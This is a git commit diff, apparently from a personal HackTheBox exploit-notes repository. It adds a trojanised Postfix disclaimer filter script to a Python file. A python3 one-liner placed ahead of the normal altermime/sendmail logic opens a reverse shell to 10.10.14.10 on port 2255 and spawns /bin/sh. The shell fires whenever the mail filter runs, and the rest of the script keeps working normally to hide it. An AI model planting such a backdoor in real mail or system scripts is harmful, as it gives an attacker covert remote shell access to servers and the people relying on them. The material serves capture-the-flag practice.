cda2a7bac56720eff4f30603ad0cbeee41e2dfa2
babywyrm <55672787+babywyrm@users.noreply.github.com>
2021-08-11 20:04:07 -0700

    Update obvi_disclaimer_haxxx_.py

--- pyth3/htb/obvi_disclaimer_haxxx_.py
+++ pyth3/htb/obvi_disclaimer_haxxx_.py
@@ -23,3 +23,57 @@ io.quit()
 
 ######################
 ##
+
+
+##########################################
+##
+###
+
+#!/bin/sh
+# Localize these.
+#######################
+##
+##
+
+/usr/bin/python3.8 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",2255));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+#########################################
+#########################################
+
+## cat disclaimer
+INSPECT_DIR=/var/spool/filter
+SENDMAIL=/usr/sbin/sendmail
+
+# Get disclaimer addresses
+DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
+
+# Exit codes from <sysexits.h>
+EX_TEMPFAIL=75
+EX_UNAVAILABLE=69
+
+# Clean up when done or when aborting.
+trap "rm -f in.$$" 0 1 2 3 15
+
+# Start processing.
+cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
+$EX_TEMPFAIL; }
+
+cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }
+
+# obtain From address
+from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`
+
+if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
+  /usr/bin/altermime --input=in.$$ \
+                   --disclaimer=/etc/postfix/disclaimer.txt \
+                   --disclaimer-html=/etc/postfix/disclaimer.txt \
+                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
+                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
+fi
+
+$SENDMAIL "$@" <in.$$
+
+exit $?
+############################
+##
+##
